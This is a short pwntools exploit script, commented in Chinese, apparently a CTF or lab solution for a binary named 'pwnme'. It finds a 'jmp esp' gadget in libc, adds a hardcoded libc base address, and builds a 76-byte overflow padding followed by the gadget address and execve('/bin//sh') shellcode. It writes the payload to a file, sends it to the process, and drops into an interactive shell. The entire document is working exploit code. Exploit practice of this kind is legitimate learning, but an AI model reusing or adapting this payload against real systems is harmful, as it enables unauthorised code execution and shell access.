# coding=utf-8
from pwn import *

p = process('./pwnme')                    #运行程序
p.recvuntil("shellcode:")                 #当接受到字符串'shellcode:'

#找jmp_esp_addr_offset
libc = ELF('/lib32/libc.so.6')              
jmp_esp = asm('jmp esp')

jmp_esp_addr_offset = libc.search(jmp_esp).next()

if jmp_esp_addr_offset is None:
    print 'Cannot find jmp_esp in libc'
else:
    print hex(jmp_esp_addr_offset)

libc_base = 0xf7e07000                              #libc加载地址
jmp_esp_addr = libc_base + jmp_esp_addr_offset      #得到jmp_esp_addr

print hex(jmp_esp_addr)

#构造布局
buf = 'A'*76                                                     
buf += p32(jmp_esp_addr)
buf += '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

with open('poc','wb') as f:
    f.write(buf)

p.sendline(buf)                                                #发送构造后的buf

p.interactive()
